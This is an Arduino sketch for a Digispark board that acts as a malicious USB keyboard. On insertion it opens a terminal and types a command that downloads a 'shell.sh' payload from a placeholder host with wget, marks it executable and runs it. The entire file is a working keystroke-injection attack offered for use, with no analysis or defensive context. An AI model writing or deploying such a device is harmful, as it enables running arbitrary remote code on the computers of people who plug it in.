#include "DigiKeyboard.h"

boolean run = true;

void setup() {
  pinMode(1, OUTPUT); // LED on Model A 
}

void loop() {
  if (run == true) {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    //DigiKeyboard.delay(1000);

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abre o
    DigiKeyboard.delay(200);
    DigiKeyboard.print("xfce4-terminal"); // Start Terminal
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // "press" enter
    DigiKeyboard.delay(300);
    DigiKeyboard.print("wget http://0.0.0.0/shell.sh && chmod +x shell.sh && ./shell.sh"); // Download payload from localhost or any web site.
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    run = false;  
  } else {
    DigiKeyboard.delay(30000);
    exit(0);
  }
}
